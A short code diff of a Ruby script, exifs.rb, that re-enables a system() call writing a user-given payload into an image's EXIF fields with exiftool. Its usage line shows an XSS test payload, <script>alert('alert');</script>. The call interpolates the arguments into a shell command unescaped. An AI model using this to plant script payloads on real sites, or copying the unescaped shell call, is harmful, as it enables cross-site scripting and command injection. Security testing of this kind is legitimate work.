@@ -22,7 +22,7 @@ def main
         ]
 
         exifs.each do |exif|
-            # system ("exiftool -#{exif}=#{payload} #{image}")
+            system ("exiftool -#{exif}=#{payload} #{image}")
         end
     else
         puts "Usage: ruby exifs.rb <image.png> '<script>alert('alert');</script>'\n"
